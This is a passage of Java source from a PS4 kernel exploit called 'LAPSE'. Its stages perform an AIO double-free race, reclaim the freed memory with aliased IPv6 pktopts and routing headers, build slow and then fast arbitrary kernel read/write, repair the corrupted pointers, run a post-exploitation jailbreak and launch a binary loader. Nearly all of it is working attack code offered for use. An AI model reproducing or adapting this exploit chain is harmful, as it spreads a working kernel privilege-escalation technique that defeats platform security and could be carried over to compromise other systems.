        Status.println("Double-free executed");
        
        Status.println("Attempting immediate memory reclaim...");
        int[] sdPair = null;
        try {
            sdPair = makeAliasedPktopts(socketsAlt);
            if (sdPair != null) {
                Status.println("Memory reclaim succeeded: " + sdPair[0] + " <-> " + sdPair[1]);
            } else {
                Status.println("Memory reclaim failed - no aliased sockets found");
            }
        } catch (Exception e) {
            Status.println("Memory reclaim failed: " + e.getMessage());
        }

        int err1 = sceErrs.getInt(0);
        int err2 = sceErrs.getInt(4);
        Status.println("Delete errors: " + Integer.toHexString(err1) + " " + Integer.toHexString(err2));

        states.putInt(0, -1);
        states.putInt(4, -1);
        
        Helper.aioMultiPoll(targetIds.address(), 2, states.address());
        Status.println("Target states: " + Integer.toHexString(states.getInt(0)) + " " + Integer.toHexString(states.getInt(4)));

        if (states.getInt(0) != Helper.SCE_KERNEL_ERROR_ESRCH) {
            Status.println("Error: bad delete of corrupt AIO request");
            return null;
        }
        if (err1 != 0 || err1 != err2) {
            Status.println("Error: bad delete of ID pair");
            return null;
        }

        if (sdPair == null) {
            Status.println("Failed to make aliased pktopts despite successful double-free");
            return null;
        }
        
        return sdPair;
    }

    private static void sprayAio(int loops, long reqs1, int numReqs, long ids, boolean multi, int cmd) {
        if (cmd == 0) cmd = Helper.AIO_CMD_READ;
        
        int step = 4 * (multi ? numReqs : 1);
        cmd = cmd | (multi ? Helper.AIO_CMD_FLAG_MULTI : 0);
        
        for (int i = 0; i < loops; i++) {
            long currentIds = ids + (i * step);
            Helper.aioSubmitCmd(cmd, reqs1, numReqs, Helper.AIO_PRIORITY_HIGH, currentIds);
        }
    }

    private static int overwriteAioEntryWithRthdr(int[] sds, Buffer reqs2, int rsize,
        long[] addrCache, int numElems, Buffer states, long aioIdsBase) {

        for (int i = 1; i <= NUM_ALIAS; i++) {

            int rthdrsSet = 0;
            for (int j = 0; j < NUM_SDS && j < sds.length; j++) {
                if (sds[j] >= 0) {
                    Helper.setRthdr(sds[j], reqs2, rsize);
                    rthdrsSet++;
                }
            }
            
            if (rthdrsSet == 0) {
                Status.println("Error: No valid sockets to set rthdr on");
                break;
            }

            for (int batch = 1; batch <= addrCache.length; batch++) {
                int batchJava = batch - 1;

                try {
                    for (int j = 0; j < numElems; j++) {
                        states.putInt(j * 4, -1);
                    }

                    Helper.aioMultiCancel(addrCache[batchJava], numElems, states.address());

                    int reqIdx = -1;
                    for (int j = 0; j < numElems; j++) {
                        int val = states.getInt(j * 4);
                        if (val == Helper.AIO_STATE_COMPLETE) {
                            reqIdx = j;
                            break;
                        }
                    }

                    if (reqIdx != -1) {
                        Status.println("states[" + reqIdx + "] = " + Integer.toHexString(states.getInt(reqIdx * 4)));
                        Status.println("found req_id at batch: " + batch);
                        Status.println("aliased at attempt: " + i);

                        int aioIdx = (batch - 1) * numElems + reqIdx;
                        long reqIdP = aioIdsBase + aioIdx * 4;
                        
                        int reqId = api.read32(reqIdP);
                        
                        Status.println("req_id = " + Integer.toHexString(reqId));

                        Helper.aioMultiPoll(reqIdP, 1, states.address());
                        Status.println("states[" + reqIdx + "] = " + Integer.toHexString(states.getInt(0)));

                        // Clear the request ID
                        api.write32(reqIdP, 0);

                        return reqId;
                    }
                    
                } catch (Exception e) {
                    Status.println("Error processing batch " + batch + ": " + e.getMessage());
                }
            }
        }

        return -1;
    }

    // STAGE 4: Get arbitrary kernel read/write
    public static boolean executeStage4(int[] pktoptsSds, long k100Addr, long kernelAddr,
        int[] sds, int[] sdsAlt, long aioInfoAddr) {
        Status.println("=== STAGE 4: Get arbitrary kernel read/write ===");

        int masterSock = pktoptsSds[0];
        Buffer tclass = new Buffer(4);
        int offTclass = KernelOffset.PS4_OFF_TCLASS;

        int pktoptsSize = 0x100;
        Buffer pktopts = new Buffer(pktoptsSize);
        int rsize = Helper.buildRoutingHeader(pktopts, pktoptsSize);
        long pktinfoP = k100Addr + 0x10;

        // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
        pktopts.putLong(0x10, pktinfoP);

        Status.println("Overwrite main pktopts");
        int reclaimSock = -1;

        Helper.syscall(Helper.SYS_CLOSE, (long)pktoptsSds[1]);

        for (int i = 1; i <= NUM_ALIAS; i++) {
            for (int j = 0; j < sdsAlt.length; j++) {
                if (sdsAlt[j] >= 0) {
                    int marker = 0x4141 | ((j + 1) << 16);
                    pktopts.putInt(offTclass, marker);
                    Helper.setRthdr(sdsAlt[j], pktopts, rsize);
                }
            }

            Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
            int marker = tclass.getInt(0);
            if ((marker & 0xffff) == 0x4141) {
                Status.println("Found reclaim sd at attempt: " + i);
                int idx = (marker >>> 16) - 1;
                if (idx >= 0 && idx < sdsAlt.length) {
                    reclaimSock = sdsAlt[idx];
                    Helper.removeSocketFromArray(sdsAlt, idx);
                    break;
                }
            }
        }

        if (reclaimSock == -1) {
            Status.println("Failed to overwrite main pktopts");
            return false;
        }

        int pktinfoLen = 0x14;
        Buffer pktinfo = new Buffer(pktinfoLen);
        pktinfo.putLong(0, pktinfoP);

        Buffer readBuf = new Buffer(8);

        // Slow kernel read implementation
        Status.println("Implementing slow kernel read");
        
        // Test read the "evf cv" string
        long testValue = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, kernelAddr);
        String testStr = Helper.extractStringFromBuffer(readBuf);
        Status.println("slowKread8(\"evf cv\"): " + Long.toHexString(testValue));
        Status.println("*(\"evf cv\"): " + testStr);

        if (!"evf cv".equals(testStr)) {
            Status.println("Test read of \"evf cv\" failed");
            return false;
        }

        Status.println("Slow arbitrary kernel read achieved");

        // Find curproc from previously freed aio_info using correct offset
        long curproc = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, aioInfoAddr + 8);

        if ((curproc >>> 48) != 0xffff) {
            Status.println("Invalid curproc kernel address: " + Long.toHexString(curproc));
            return false;
        }

        // Verify curproc by checking PID with correct offset
        long possiblePid = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_PID);
        long currentPid = Helper.syscall(Helper.SYS_GETPID);

        Status.println("Current PID: " + currentPid);
        Status.println("Found PID at curproc+0xb0: " + (possiblePid & 0xffffffffL));

        if ((possiblePid & 0xffffffffL) != currentPid) {
            Status.println("Curproc verification failed: " + Long.toHexString(curproc));
            return false;
        }

        Status.println("curproc = " + Long.toHexString(curproc));

        // Store kernel addresses
        Kernel.addr.curproc = curproc;
        Kernel.addr.insideKdata = kernelAddr;

        // Use slow kernel read for address resolution
        long curprocFd = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_FD);
        long curprocOfiles = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curprocFd) + KernelOffset.FILEDESC_OFILES;

        Status.println("curproc_fd = " + Long.toHexString(curprocFd));
        Status.println("curproc_ofiles = " + Long.toHexString(curprocOfiles));

        // Create worker socket for fast R/W
        int workerSock = Helper.createUdpSocket();
        Buffer workerPktinfo = new Buffer(pktinfoLen);

        // Create pktopts on worker_sock
        Helper.setSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, workerPktinfo, pktinfoLen);

        // Get worker socket's pktopts address using slow read
        long workerFdData = Kernel.getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, readBuf, workerSock, curprocOfiles);
        long workerPcb = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerFdData + KernelOffset.SO_PCB);
        long workerPktopts = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerPcb + KernelOffset.INPCB_PKTOPTS);

        Status.println("worker_fd_data = " + Long.toHexString(workerFdData));
        Status.println("worker_pcb = " + Long.toHexString(workerPcb));
        Status.println("worker_pktopts = " + Long.toHexString(workerPktopts));

        // Initialize fast kernel R/W
        kernelRW = new Kernel.KernelRW(masterSock, workerSock, curprocOfiles);
        kernelRW.setupPktinfo(workerPktopts);
        
        Kernel.setKernelAddresses(curproc, curprocOfiles, kernelAddr, 0);

        Status.println("Arbitrary kernel r/w achieved!");

        // Fix corrupt pointers
        Status.println("Applying fixes to corrupt pointers");

        int offIp6poRthdr = KernelOffset.PS4_OFF_IP6PO_RTHDR;

        // Fix rthdr pointers for all sockets
        for (int i = 0; i < sds.length; i++) {
            if (sds[i] >= 0) {
                long sockPktopts = kernelRW.getSockPktopts(sds[i]);
                kernelRW.kwrite8(sockPktopts + offIp6poRthdr, 0);
            }
        }

        long reclaimerPktopts = kernelRW.getSockPktopts(reclaimSock);
        kernelRW.kwrite8(reclaimerPktopts + offIp6poRthdr, 0);

        long workerPktoptsAddr = kernelRW.getSockPktopts(workerSock);
        kernelRW.kwrite8(workerPktoptsAddr + offIp6poRthdr, 0);

        // Increase ref counts - only for sockets we actually have
        int[] sockIncreaseRef = {masterSock, workerSock, reclaimSock};

        for (int i = 0; i < sockIncreaseRef.length; i++) {
            long sockAddr = kernelRW.getFdDataAddr(sockIncreaseRef[i]);
            kernelRW.kwrite32(sockAddr + 0x0, 0x100);  // so_count
        }

        Status.println("Fixes applied");
        return true;
        
    }

    // Cleanup function
    public static void cleanup() {
        Status.println("Performing cleanup...");

        try {
            // Close socketpair
            if (blockFd >= 0) {
                Helper.syscall(Helper.SYS_CLOSE, (long)blockFd);
                blockFd = -1;
            }
            if (unblockFd >= 0) {
                Helper.syscall(Helper.SYS_CLOSE, (long)unblockFd);
                unblockFd = -1;
            }

            // Free grooming AIOs
            if (groomIds != null) {
                Buffer errors = new Buffer(4 * Helper.MAX_AIO_IDS);

                for (int i = 0; i < NUM_GROOMS; i += Helper.MAX_AIO_IDS) {
                    int batchSize = Math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i);
                    Buffer batchIds = new Buffer(4 * batchSize);

                    for (int j = 0; j < batchSize; j++) {
                        batchIds.putInt(j * 4, groomIds[i + j]);
                    }

                    // Poll and delete (no cancel - free_aios2 pattern)
                    Helper.aioMultiPoll(batchIds.address(), batchSize, errors.address());
                    Helper.aioMultiDelete(batchIds.address(), batchSize, errors.address());
                }
                groomIds = null;
            }

            // Unblock and delete blocking AIO
            if (blockId >= 0) {
                Buffer blockIdBuf = new Buffer(4);
                blockIdBuf.putInt(0, blockId);
                Buffer blockErrors = new Buffer(4);

                Helper.aioMultiWait(blockIdBuf.address(), 1, blockErrors.address(), 1, 0L);
                Helper.aioMultiDelete(blockIdBuf.address(), 1, blockErrors.address());
                blockId = -1;
            }

            // Close sockets
            if (sockets != null) {
                for (int i = 0; i < sockets.length; i++) {
                    if (sockets[i] >= 0) {
                        Helper.syscall(Helper.SYS_CLOSE, (long)sockets[i]);
                        sockets[i] = -1;
                    }
                }
                sockets = null;
            }

            // Close socketsAlt
            if (socketsAlt != null) {
                for (int i = 0; i < socketsAlt.length; i++) {
                    if (socketsAlt[i] >= 0) {
                        Helper.syscall(Helper.SYS_CLOSE, (long)socketsAlt[i]);
                        socketsAlt[i] = -1;
                    }
                }
                socketsAlt = null;
            }

            // Restore previous core
            if (previousCore >= 0) {
                Status.println("Restoring to previous core: " + previousCore);
                Helper.pinToCore(previousCore);
                previousCore = -1;
            }

            // Reset kernel state
            if (Kernel.addr != null) {
                Kernel.addr.reset();
            }
            kernelRW = null;

        } catch (Exception e) {
            Status.println("Error during cleanup: " + e.getMessage());
        }
    }
    
    public static void printReboot() {
        NativeInvoke.sendNotificationRequest("Exploit failed - Reboot and try again");
        Status.println("Exploit failed - Reboot and try again");
    }


    public static void main(String[] args) {
        NativeInvoke.sendNotificationRequest(VERSION_STRING);
        Status.println("=== LAPSE EXPLOIT ===");
        
        try {
            initializeExploit();
                    
            if (Helper.isJailbroken()) {
                NativeInvoke.sendNotificationRequest("Already Jailbroken");
                Status.println("Already Jailbroken");
                return;
            }
            
            Helper.printSystemInfo();
            
            if (!checkCompatibility()) {
                return;
            }
            
            if (!performSetup()) {
                Status.println("Setup failed - aborting exploit");
                printReboot();
                cleanup();
                return;
            }
            
            // Create socketsAlt for stages
            socketsAlt = new int[NUM_SDS_ALT];
            for (int i = 0; i < NUM_SDS_ALT; i++) {
                socketsAlt[i] = Helper.createUdpSocket();
            }
            
            int[] aliasedPair = executeStage1();
            if (aliasedPair == null) {
                Status.println("FAILED: Stage 1 race condition failed");
                printReboot();
                cleanup();
                return;
            }
            Status.println("SUCCESS: Stage 1 completed successfully!");
            
            if (!executeStage2(aliasedPair)) {
                Status.println("FAILED: Stage 2 kernel address leaking failed");
                printReboot();
                cleanup();
                return;
            }
            Status.println("SUCCESS: Stage 2 completed successfully!");
            
            int[] pktoptsSds = executeStage3(aliasedPair[0]);
            if (pktoptsSds == null) {
                Status.println("FAILED: Stage 3 double free SceKernelAioRWRequest failed");
                printReboot();
                cleanup();
                return;
            }
            Helper.syscall(Helper.SYS_CLOSE, (long)fakeReqs3Sd);
            Status.println("SUCCESS: Stage 3 completed successfully!");
            
            if (!executeStage4(pktoptsSds, reqs1Addr, kernelAddr, sockets, socketsAlt, aioInfoAddr)) {
                Status.println("FAILED: Stage 4 arbitrary kernel read/write failed");
                printReboot();
                cleanup();
                return;
            }
            Status.println("SUCCESS: Stage 4 completed successfully!");
            
            if (!Kernel.postExploitationPS4()) {
                Status.println("FAILED: Stage 5 post exploitation failed");
                printReboot();
                cleanup();
                return;
            }
            
            cleanup();
            BinLoader.start();
            
            return;
            
        } catch (Exception e) {
            Status.printStackTrace("Exploit failed : ", e);
            printReboot();
            cleanup();
        }
        
    }
}